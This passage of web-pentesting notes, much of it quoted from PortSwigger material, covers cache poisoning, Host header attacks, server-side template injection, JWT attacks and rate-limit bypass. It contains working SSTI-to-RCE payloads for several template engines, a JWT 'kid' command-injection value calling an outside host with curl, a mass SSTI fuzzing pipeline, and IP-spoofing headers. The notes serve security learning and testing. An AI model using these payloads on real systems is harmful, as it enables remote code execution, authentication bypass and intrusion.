### 3. **Identify an exploitable gadget**

By now, you should have a relatively solid understanding of how the target website's cache behaves and might have found some interesting flaws in the way the cache key is constructed. The final step is to identify a suitable gadget that you can chain with this cache key flaw. This is an important skill because the severity of any web cache poisoning attack is heavily dependent on the gadget you are able to exploit.

These gadgets will often be classic client-side vulnerabilities, such as reflected XSS and open redirects. By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.

Perhaps even more interestingly, these techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched. This includes the use of dynamic content in resource files, and exploits requiring malformed requests that a browser would never send.

</dd>
</dl>

</details>

<details>
<summary>Exploiting cache key flaws</summary>

<dl>
<dd>

<details>
<summary>### **Unkeyed port</summary>

<dl>
<dd>

**The`Host`header is often part of the cache key and, as such, initially seems an unlikely candidate for injecting any kind of payload. However, some caching systems will parse the header and exclude the port from the cache key.**

**In this case, you can potentially use this header for web cache poisoning. For example, consider the case we saw earlier where a redirect URL was dynamically generated based on the`Host`header. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired.**

**This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example.**

</dd>
</dl>

</details>

<details>
<summary>### **Unkeyed query string</summary>

<dl>
<dd>

**Like the`Host`header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string.**

<details>
<summary>Detecting an unkeyed query string</summary>

<dl>
<dd>

**If the response explicitly tells you whether you got a cache hit or not, this transformation is relatively simple to spot - but what if it doesn't? This has the side-effect of making dynamic pages appear as though they are fully static because it can be hard to know whether you are communicating with the cache or the server.**

**To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster query parameters redundant.**

**Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that doesn't interfere with the application's behavior. Some typical examples include:**

```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

**If you use Param Miner, you can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers". It will then automatically add a cache buster to commonly keyed headers in any requests that you send using Burp's manual testing tools.**

**Another approach is to see whether there are any discrepancies between how the cache and the back-end normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit this to issue requests with different keys that still hit the same endpoint. For example, the following entries might all be cached separately but treated as equivalent to`GET /`on the back-end:**

**Apache:`GET //`Nginx:`GET /%2F`PHP:`GET /index.php/xyz`.NET`GET /(A(xyz)/`**

**This transformation can sometimes mask what would otherwise be glaringly obviousreflected XSSvulnerabilities. If penetration testers or automated scanners only receive cached responses without realizing, it can appear as though there is no reflected XSS on the page.**

</dd>
</dl>

</details>

<details>
<summary>### **Exploiting an unkeyed query string</summary>

<dl>
<dd>

**Excluding the query string from the cache key can actually make these reflected XSS vulnerabilities even more severe.**

**Usually, such an attack would rely on inducing the victim to visit a maliciously crafted URL. However, poisoning the cache via an unkeyed query string would cause the payload to be served to users who visit what would otherwise be a perfectly normal URL. This has the potential to impact a far greater number of victims with no further interaction from the attacker.**

**LAB** **Web cache poisoning via an unkeyed query string**

</dd>
</dl>

</details>

<details>
<summary>### **Unkeyed query parameters</summary>

<dl>
<dd>

**So far we've seen that on some websites, the entire query string is excluded from the cache key. But some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like`utm_content`are good candidates to check during testing.**

**Parameters that have been excluded from the cache key are unlikely to have a significant impact on the response. The chances are there won't be any useful gadgets that accept input from these parameters. That said, some pages handle the entire URL in a vulnerable manner, making it possible to exploit arbitrary parameters.**

**LAB** **Web cache poisoning via an unkeyed query parameter**

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>### **Cache parameter cloaking</summary>

<dl>
<dd>

**If the cache excludes a harmless parameter from the cache key, and you can't find any exploitable gadgets based on the full URL, you'd be forgiven for thinking that you've reached a dead end. However, this is actually where things can get interesting.**

**If you can work out how the cache parses the URL to identify and remove the unwanted parameters, you might find some interesting quirks. Of particular interest are any parsing discrepancies between the cache and the application. This can potentially allow you to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded parameter.**

**For example, the de facto standard is that a parameter will either be preceded by a question mark (`?`), if it's the first one in the query string, or an ampersand (`&`). Some poorly written parsing algorithms will treat any`?`as the start of a new parameter, regardless of whether it's the first one or not.**

**Let's assume that the algorithm for excluding parameters from the cache key behaves in this way, but the server's algorithm only accepts the first`?`as a delimiter. Consider the following request:**

```
GET /?example=123?excluded_param=bad-stuff-here
```

**In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second`?`as a delimiter and instead only sees one parameter,`example`, whose value is the entire rest of the query string, including our payload. If the value of`example`is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.**

### **Exploiting parameter parsing quirks**

**Similar parameter cloaking issues can arise in the opposite scenario, where the back-end identifies distinct parameters that the cache does not. The Ruby on Rails framework, for example, interprets both ampersands (&) and semicolons (;) as delimiters. When used in conjunction with a cache that does not allow this, you can potentially exploit another quirk to override the value of a keyed parameter in the application logic.**

**Consider the following request:**

```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```

**As the names suggest,`keyed_param`is included in the cache key, but`excluded_param`is not. Many caches will only interpret this as two parameters, delimited by the ampersand:**

1. **`keyed_param=abc`**

2. **`excluded_param=123;keyed_param=bad-stuff-here`**

**Once the parsing algorithm removes the`excluded_param`, the cache key will only contain`keyed_param=abc`. On the back-end, however, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:**

1. **`keyed_param=abc`**

2. **`excluded_param=123`**

3. **`keyed_param=bad-stuff-here`**

**But now there is a duplicate`keyed_param`. This is where the second quirk comes into play. If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence. The end result is that the cache key contains an innocent, expected parameter value, allowing the cached response to be served as normal to other users. On the back-end, however, the same parameter has a completely different value, which is our injected payload. It is this second value that will be passed into the gadget and reflected in the poisoned response.**

**This exploit can be especially powerful if it gives you control over a function that will be executed. For example, if a website is using JSONP to make a cross-domain request, this will often contain a`callback`parameter to execute a given function on the returned data:**

```
GET /jsonp?callback=innocentFunction
```

**In this case, you could use these techniques to override the expected callback function and execute arbitrary JavaScript instead.**

**LAB**

**PRACTITIONERParameter cloaking**

### **Exploiting fat GET support**

**In select cases, the HTTP method may not be keyed. This might allow you to poison the cache with a`POST`request containing a malicious payload in the body. Your payload would then even be served in response to users'`GET`requests. Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a`GET`request to create a "fat"`GET`request:**

```
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```

**In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.**

**LAB**

**PRACTITIONERWeb cache poisoning via a fat GET request**

**This is only possible if a website accepts`GET`requests that have a body, but there are potential workarounds. You can sometimes encourage "fat`GET`" handling by overriding the HTTP method, for example:**

```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

**As long as the`X-HTTP-Method-Override`header is unkeyed, you could submit a pseudo-`POST`request while preserving a`GET`cache key derived from the request line.**

### **Exploiting dynamic content in resource imports**

**Imported resource files are typically static but some reflect input from the query string. This is mostly considered harmless because browsers rarely execute these files when viewed directly, and an attacker has no control over the URLs used to load a page's subresources. However, by combining this with web cache poisoning, you can occasionally inject content into the resource file.**

**For example, consider a page that reflects the current query string in an import statement:**

```
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```

**You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import`/style.css`.**

**If the page importing the CSS file doesn't specify a`doctype`, you can maybe even exploit static CSS files. Given the right configuration, browsers will simply scour the document looking for CSS and then execute it. This means that you can occasionally poison static CSS files by triggering a server error that reflects the excluded query parameter:**

```
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1){}*{color:red;}
```

</dd>
</dl>

</details>

<details>
<summary>### **Normalized cache keys</summary>

<dl>
<dd>

**Any normalization applied to the cache key can also introduce exploitable behavior. In fact, it can occasionally enable some exploits that would otherwise be almost impossible.**

**For example, when you find reflected XSS in a parameter, it is often unexploitable in practice. This is because modern browsers typically URL-encode the necessary characters when sending the request, and the server doesn't decode them. The response that the intended victim receives will merely contain a harmless URL-encoded string.**

**Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key:**

```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```

**This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities. If you send a malicious request using Burp Repeater, you can poison the cache with an unencoded XSS payload. When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload.**

**As a result, the cache will serve the poisoned response and the payload will be executed client-side. You just need to make sure that the cache is poisoned when the victim visits the URL.**

**LAB**

**PRACTITIONERURL normalization**

</dd>
</dl>

</details>

<details>
<summary>### **Cache key injection</summary>

<dl>
<dd>

**You will sometimes discover a client-side vulnerability in a keyed header. This is also a classic "unexploitable" issue that can sometimes be exploited using cache poisoning.**

**Keyed components are often bundled together in a string to create the cache key. If the cache doesn't implement proper escaping of the delimiters between the components, you can potentially exploit this behavior to craft two different requests that have the same cache key.**

**The following example uses double-underscores to delimit different components in the cache key and does not escape them. You can exploit this by first poisoning the cache with a request containing your payload in the corresponding keyed header:**

```
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>…'-alert(1)-'…</script>
```

**If you then induce a victim user to visit the following URL, they would be served the poisoned response:**

```
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
X-Cache: hit

<script>…'-alert(1)-'…</script>
```

**LAB**

**EXPERTCache key injection**

</dd>
</dl>

</details>

<details>
<summary>## **Poisoning internal caches</summary>

<dl>
<dd>

**So far, we've looked at how you can exploit flaws in the way external web caches are implemented to expose an extended attack surface hidden within seemingly keyed components. However, some websites implement caching behavior directly into the application in addition to using a distinct, external component. This can have several advantages, such as avoiding the kind of parsing discrepancies we looked at earlier.**

**As these integrated caches are purpose-built for the specific application, this also gives developers the freedom to tailor their behavior to a greater degree. As a result, these caches can sometimes behave in unusual ways that you wouldn't typically see from a more standardized, external cache that needs to be compatible with multiple applications. Sometimes, these strange behaviors can also provide an opportunity for some high-severity cache poisoning exploits.**

**Instead of caching entire responses, some of these caches break the response down into reusable fragments and cache them each separately. For example, a snippet for importing a widely used resource might be stored as a standalone cache entry. Users might then receive a response comprising a mixture of content from the server, as well as several individual fragments from the cache.**

**As these cached fragments are intended to be reusable across multiple distinct responses, the concept of a cache key doesn't really apply. Every response that contains a given fragment will reuse the same cached fragment, even if the rest of the response is completely different. In a scenario like this, poisoning the cache can have wide-reaching effects, especially if you poison a fragment that is used on every page. As there is no cache key, you would have poisoned every page, for every user, with a single request.**

**This will often only require you to use basic web cache poisoning techniques, such as manipulating the`Host`header.**

### **How to identify internal caches**

**One of the challenges posed by integrated, application-level caches is that they can be difficult to identify and investigate because there is often no user-facing feedback. To identify these caches, you can look for a few tell-tale signs.**

**For example, if the response reflects a mixture of both input from the last request you sent and input from a previous request, this is a key indicator that the cache is storing fragments rather than entire responses. The same applies if your input is reflected in responses on multiple distinct pages, in particular on pages in which you never tried to inject your input.**

**Other times, the cache's behavior may simply be so unusual that the most logical conclusion is that it must be a unique and specialized internal cache.**

**When a website implements multiple layers of caching, it can make it difficult to comprehend what is happening behind the scenes and understand how the website's caching system behaves.**

**LAB**

**EXPERTInternal cache poisoning**

### **Testing internal caches safely**

**When testing ordinary web caches, we recommend using a cache buster to prevent your poisoned response from being served to other users. However, if an integrated cache has no concept of cache keys, then traditional cache busters are useless. This means that it's very easy to accidentally poison the cache for genuine users.**

**Therefore, it is important that you do your best to mitigate the potential damage when testing these kinds of vulnerabilities. Think carefully about the effect of your injected payload before sending each request. In particular, you should make sure that you only poison the cache using a domain that you control, rather than some arbitrary "`evil-user.net`". This way, you are in control of what happens next if something goes wrong.**

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Just recon, find subdomain and append .css, MISS -> HIT, Done

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

The **Varyheader** HTTP response header describes the parts of the request message and is most often used to create a cache key. This mitigates attacks such as **cache poisoning**, where an attacker is able to store malicious content within the cache.

In some cases, the Vary header value(s) indicate that a potential input might be trusted by user input.

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Some caching servers would cache files larger than 2mb. if app accepts file upload, then upload a large file and access it #multiple times while logged-in. It will be cached. Then access it without login, and pingo! unauthenticated access to sensitive files!

</dd>
</dl>

</details>

<details>
<summary>custom headers</summary>

<dl>
<dd>

1. `Forwarded: for=example.com;host=example.com;proto=https, for=23.45.67.89` -unknown

2. `": 1` - akamai

3. `Pragma: akamai-x-cache-on, akamai-x-cache-remote-on` - akamai

4. `X-Akamai-Request-ID: abcdef1234567890` - akamai

5. `X-Forwarded-Proto: http` - cloudflare

6. `X-Forwarded-Scheme: http` - unknown

7. `\:` - Akamai

8. `Te: Trailers` - unknown

9. `X-Custom-Header: custom-value` - unknown

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>HTTP Host header attacks</summary>

<dl>
<dd>

<details>
<summary>How to test for vulnerabilities using the HTTP Host header</summary>

<dl>
<dd>

To test whether a website is vulnerable to attack via the HTTP Host header, you will need an intercepting proxy, such as Burp Proxy, and manual testing tools like Burp Repeater and Burp Intruder.

In short, you need to identify whether you are able to modify the Host header and still reach the target application with your request. If so, you can use this header to probe the application and observe what effect this has on the response.

<details>
<summary>### **Supply an arbitrary Host header</summary>

<dl>
<dd>

When probing for Host header injection vulnerabilities, the first step is to test what happens when you supply an arbitrary, unrecognized domain name via the Host header.

Some intercepting proxies derive the target IP address from the Host header directly, which makes this kind of testing all but impossible; any changes you made to the header would just cause the request to be sent to a completely different IP address. However, Burp Suite accurately maintains the separation between the Host header and the target IP address. This separation allows you to supply any arbitrary or malformed Host header that you want, while still making sure that the request is sent to the intended target.

Tip  
The target URL is displayed either at the top of the panel (for Burp Repeater and Proxy interception) or on the "Target" tab in Burp Intruder. You can edit the target manually by clicking the pencil icon.

Sometimes, you will still be able to access the target website even when you supply an unexpected Host header. This could be for a number of reasons. For example, servers are sometimes configured with a default or fallback option in case they receive requests for domain names that they don't recognize. If your target website happens to be the default, you're in luck. In this case, you can begin studying what the application does with the Host header and whether this behavior is exploitable.

On the other hand, as the Host header is such a fundamental part of how the websites work, tampering with it often means you will be unable to reach the target application at all. The front-end server or load balancer that received your request may simply not know where to forward it, resulting in an "`Invalid Host header`" error of some kind. This is especially likely if your target is accessed via a CDN. In this case, you should move on to trying some of the techniques outlined below.

</dd>
</dl>

</details>

<details>
<summary>### **Check for flawed validation</summary>

<dl>
<dd>

Instead of receiving an "`Invalid Host header`" response, you might find that your request is blocked as a result of some kind of security measure. For example, some websites will validate whether the Host header matches the SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks.

You should try to understand how the website parses the Host header. This can sometimes reveal loopholes that can be used to bypass the validation. For example, some parsing algorithms will omit the port from the Host header, meaning that only the domain name is validated. If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you reach the target application, while potentially injecting a payload via the port.

```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

Other sites will try to apply matching logic to allow for arbitrary subdomains. In this case, you may be able to bypass the validation entirely by registering an arbitrary domain name that ends with the same sequence of characters as a whitelisted one:

```
GET /example HTTP/1.1
Host: notvulnerable-website.com
```

Alternatively, you could take advantage of a less-secure subdomain that you have already compromised:

```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

For further examples of common domain-validation flaws, check out our content on circumventing common SSRF defences and Origin header parsing errors.

</dd>
</dl>

</details>

<details>
<summary>### **Send ambiguous requests</summary>

<dl>
<dd>

The code that validates the host and the code that does something vulnerable with it often reside in different application components or even on separate servers. By identifying and exploiting discrepancies in how they retrieve the Host header, you may be able to issue an ambiguous request that appears to have a different host depending on which system is looking at it.

The following are just a few examples of how you may be able to create ambiguous requests.

<details>
<summary>### **Inject duplicate Host headers</summary>

<dl>
<dd>

One possible approach is to try adding duplicate Host headers. Admittedly, this will often just result in your request being blocked. However, as a browser is unlikely to ever send such a request, you may occasionally find that developers have not anticipated this scenario. In this case, you might expose some interesting behavioral quirks.

Different systems and technologies will handle this case differently, but it is common for one of the two headers to be given precedence over the other one, effectively overriding its value. When systems disagree about which header is the correct one, this can lead to discrepancies that you may be able to exploit. Consider the following request:

```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

Let's say the front-end gives precedence to the first instance of the header, but the back-end prefers the final instance. Given this scenario, you could use the first header to ensure that your request is routed to the intended target and use the second header to pass your payload into the server-side code.

</dd>
</dl>

</details>

<details>
<summary>### **Supply an absolute URL</summary>

<dl>
<dd>

Although the request line typically specifies a relative path on the requested domain, many servers are also configured to understand requests for absolute URLs.

The ambiguity caused by supplying both an absolute URL and a Host header can also lead to discrepancies between different systems. Officially, the request line should be given precedence when routing the request but, in practice, this isn't always the case. You can potentially exploit these discrepancies in much the same way as duplicate Host headers.

```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

Note that you may also need to experiment with different protocols. Servers will sometimes behave differently depending on whether the request line contains an HTTP or an HTTPS URL.

</dd>
</dl>

</details>

<details>
<summary>### **Add line wrapping</summary>

<dl>
<dd>

You can also uncover quirky behavior by indenting HTTP headers with a space character. Some servers will interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's value. Other servers will ignore the indented header altogether.

Due to the highly inconsistent handling of this case, there will often be discrepancies between different systems that process your request. For example, consider the following request:

```
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this. If the front-end ignores the indented header, the request will be processed as an ordinary request for `vulnerable-website.com`. Now let's say the back-end ignores the leading space and gives precedence to the first header in the case of duplicates. This discrepancy might allow you to pass arbitrary values via the "wrapped" Host header.

</dd>
</dl>

</details>

<details>
<summary>### **Other techniques</summary>

<dl>
<dd>

This is just a small sample of the many possible ways to issue harmful, ambiguous requests. For example, you can also adapt many HTTP request smuggling techniques to construct Host header attacks. We'll cover this in more detail in our dedicated request smuggling topic.

**Read more**

- HTTP request smuggling.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>### **Inject host override headers</summary>

<dl>
<dd>

Even if you can't override the Host header using an ambiguous request, there are other possibilities for overriding its value while leaving it intact. This includes injecting your payload via one of several other HTTP headers that are designed to serve just this purpose, albeit for more innocent use cases.

As we've already discussed, websites are often accessed via some kind of intermediary system, such as a load balancer or a reverse proxy. In this kind of architecture, the Host header that the back-end server receives may contain the domain name for one of these intermediary systems. This is usually not relevant for the requested functionality.

To solve this problem, the front-end may inject the `X-Forwarded-Host` header, containing the original value of the Host header from the client's initial request. For this reason, when an`X-Forwarded-Host` header is present, many frameworks will refer to this instead. You may observe this behavior even when there is no front-end that uses this header.

You can sometimes use `X-Forwarded-Host` to inject your malicious input while circumventing any validation on the Host header itself.

```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```

Although `X-Forwarded-Host` is the de facto standard for this behavior, you may come across other headers that serve a similar purpose, including:

- `X-Host`

- `X-Forwarded-Server`

- `X-HTTP-Host-Override`

- `Forwarded`

Tip  
In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.

From a security perspective, it is important to note that some websites, potentially even your own, support this kind of behavior unintentionally. This is usually because one or more of these headers is enabled by default in some third-party technology that they use.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Exploiting</summary>

<dl>
<dd>

https://portswigger.net/web-security/host-header/exploiting#how-to-exploit-the-http-host-header

https://hackerone.com/reports/317476

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>SSTi</summary>

<dl>
<dd>

<details>
<summary>Constructing a server-side template injection attack</summary>

<dl>
<dd>

Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process.

![](https://portswigger.net/web-security/images/ssti-methodology-diagram.png)

### **Detect**

Server-side template injection vulnerabilities often go unnoticed not because they are complex but because they are only really apparent to auditors who are explicitly looking for them. If you are able to detect that a vulnerability is present, it can be surprisingly easy to exploit it. This is especially true in unsandboxed environments.

As with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%%'"}}%\`. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.

Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.

### **Plaintext context**

Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. For example, in Freemarker, the line`render('Hello ' + username)` would render to something like `Hello Carlos`.

This can sometimes be exploited for [XSS and is in fact often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack.

For example, consider a template that contains the following vulnerable code:

```
render('Hello ' + username)
```

During auditing, we might test for server-side template injection by requesting a URL such as:

```
http://vulnerable-website.com/?username=${7*7}
```

If the resulting output contains `Hello 49`, this shows that the mathematical operation is being evaluated server-side. This is a good proof of concept for a server-side template injection vulnerability.

Note that the specific syntax required to successfully evaluate the mathematical operation will vary depending on which template engine is being used. We'll discuss this in more detail in the Identify step.

### **Code context**

In other cases, the vulnerability is exposed by user input being placed within a template expression, as we saw earlier with our email example. This may take the form of a user-controllable variable name being placed inside a parameter, such as:

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

On the website, the resulting URL would be something like:

```
http://vulnerable-website.com/?greeting=data.username
```

This would be rendered in the output to `Hello Carlos`, for example.

This context is easily missed during assessment because it doesn't result in obvious XSS and is almost indistinguishable from a simple hashmap lookup. One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:

```
http://vulnerable-website.com/?greeting=data.username<tag>
```

In the absence of XSS, this will usually either result in a blank entry in the output (just `Hello` with no username), encoded tags, or an error message. The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible. Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:

```
Hello Carlos<tag>
```

### **Identify**

Once you have detected the template injection potential, the next step is to identify the template engine.

Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.

Simply submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version. For example, the invalid expression `<%=foobar%>` triggers the following response from the Ruby-based ERB engine:

```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

Otherwise, you'll need to manually test different language-specific payloads and study how they are interpreted by the template engine. Using a process of elimination based on which syntax appears to be valid or invalid, you can narrow down the options quicker than you might think. A common way of doing this is to inject arbitrary mathematical operations using syntax from different template engines. You can then observe whether they are successfully evaluated. To help with this process, you can use a decision tree similar to the following:

![](https://portswigger.net/web-security/images/template-decision-tree.png)

You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.

### **Exploit**

After detecting that a potential vulnerability exists and successfully identifying the template engine, you can begin trying to find ways of exploiting it.

- https://portswigger.net/web-security/server-side-template-injection/exploiting

</dd>
</dl>

</details>

<details>
<summary>Detection Payload</summary>

<dl>
<dd>

```
${{<%[%'"}}%\.
```

In case of a vulnerability, an error message can be returned or the exception can be raised by the server. This can be used to identify the vulnerability and the template engine in use.

</dd>
</dl>

</details>

<details>
<summary>https://github.com/epinna/tplmap</summary>



</details>

<details>
<summary>Quick SSTI</summary>

<dl>
<dd>

1. waybackurls http://target.com | qsreplace "daman{{9\*9}}" > fuzz.txt

> searched: daman81 in burp, got 43 results from 1266 requests, noiicee

2. ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/

3. for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done

</dd>
</dl>

</details>

<details>
<summary>Payloads</summary>

<dl>
<dd>

SSTI to RCE payload

{{\_self.env.registerUndefinedFilterCallback("exec")}}{{\_self.env.getFilter("cat /home/min/user.txt")}}

{{lipsum.**builtins**.eval(request.args.cmd)}}&cmd=**import**("subprocess").check\_output("whoami")

Python - Jinja2  
{{7\*'7'}}  
Python - Tornado  
{% import subprocess %}{{subprocess.Popen('whoami',shell=True,stdout=-1).communicate()[]}}  
Ruby - ERB  
<%= IO.popen('whoami').readline() %>  
Java Freemarker  
${"freemarker.template.utility.Execute"?new()("whoami")}

![](image.png)

![](image%201.png)

![](image%202.png)

![](image%203.png)

</dd>
</dl>

</details>

<details>
<summary>Common template engines</summary>

<dl>
<dd>

- PHP – Smarty, Twigs

- Java – Velocity, Freemaker

- Python – JINJA, Mako, Tornado

- JavaScript – Jade, Rage

- Ruby – Liquid

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>JWT attacks</summary>

<dl>
<dd>

<details>
<summary>https://github.com/ticarpi/jwt_tool</summary>



</details>

<details>
<summary>Checklist</summary>

<dl>
<dd>

1. Signature not checked? → Modify the body,

2. Signature checked only if it exists? → Modify the body and delete signature.

3. Weak signature → Bruteforcing signature.

4. None Algorithm attack (Change algorithm to None/none/nONE/NONE).

5. Application uses RS256 algorithm? → Look for public key using recon. Change the algorithm to HS256 and generate new token using public key.

6. Vulnerable Kid: The kid (key ID) is a hint indicating which key was used to secure the JWS (JSON Web Signature). It's generally used when there are multiple keys to sign the tokens and we need to look up the right one to verify the signature.

`6.1. Change kid url to your url so that the application use your key to verify the modified JWT token.  
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key  
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub  
  
"kid":"http://localhost/key.pem" --> "kid":"http://xyz.ngrok.io/jwtRS256.key"  
  
6.2. Try publicly accesible files to verify the token.  
"kid":"app/secret.pem" --> "kid":"../../public/main.css"  
  
6.3. Command Injection:  
"kid":"app/secret.pem && curl http://bing.com &"  
  
6.4. SQLi:  
  
"kid":"hello UNION SELECT 'key';--"`

</dd>
</dl>

</details>

<details>
<summary>https://x.com/intigriti/status/1690329030254583808?s=20</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>CORS</summary>



</details>

<details>
<summary>Rate-limiting</summary>

<dl>
<dd>

<details>
<summary>Bypass</summary>

<dl>
<dd>

Rate-limit bypass trick:  
Append null parameter "%00" to the request parameter value. For example: Username=usertest%00

It worked for me just now on a login endpoint. You can use this trick when the server is blocking only a particular user/phone/email.

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

If an attacker includes the ak\_bmsc cookie with a random/none value, it’s possible to bypass this protection. This allows an attacker to bypass rate limit and *may* lead to the authorized/authenticated endpoint being reached by the attacker.

</dd>
</dl>

</details>

<details>
<summary>All about Rate Limiting</summary>

<dl>
<dd>

https://twitter.com/snap_sec/status/1479030972263723015?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Permanenet DOS by account lockout of victim</summary>

<dl>
<dd>

https://twitter.com/AkashHamal0x01/status/1401072585756975105?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Checklist</summary>

<dl>
<dd>

1. Ip Rotator - If developer implemented rate limit in such a way that the application blocks the ip address of attacker after few requests, then you may try using IP Rotator extension to change your IP in each requests.

2. Add the following headers in the request:

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

Instead of 127.0.0.1, try using 127.0.0.2, 127.0.0.3,...

Even you can try using double X-Forwared-For header:

```
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

1. Try changing user-agent, cookies.

